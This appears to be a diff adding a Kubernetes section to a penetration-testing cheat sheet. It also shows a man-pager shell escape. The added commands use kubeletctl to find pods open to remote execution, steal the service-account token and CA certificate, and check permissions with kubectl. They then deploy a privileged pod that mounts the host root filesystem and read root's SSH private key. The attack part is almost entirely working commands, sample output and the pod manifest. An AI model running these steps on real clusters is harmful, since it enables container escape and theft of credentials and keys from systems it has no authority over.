@@ -1070,3 +1070,60 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 MAN_DISABLE_SECCOMP=1 man -P '/bin/sh -c "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; export PATH; exec /bin/sh -i </dev/tty >/dev/tty 2>&1"' man
 ```
+### Abusing Services
+###### Kubernetes
+```
+kubeletctl -i --server target_ip pods | curl https://10.129.10.11:10250/pods -k | jq .
+kubeletctl -i --server 10.129.10.11 scan rce
+┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                   Node with pods vulnerable to RCE                                  │
+├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
+│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│   │              │                                    │             │                         │ RUN │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+
+kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
+kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
+kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+export token=`cat k8.token`
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
+Resources										Non-Resource URLs	Resource Names	Verbs 
+selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
+selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
+pods											[]					[]				[get create list]
+...SNIP...
+
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
+NAME	READY	STATUS	RESTARTS	AGE
+nginx	1/1		Running	0			23m
+privesc	1/1		Running	0			12s
+
+kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
+```
+privesc.yaml
+```
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
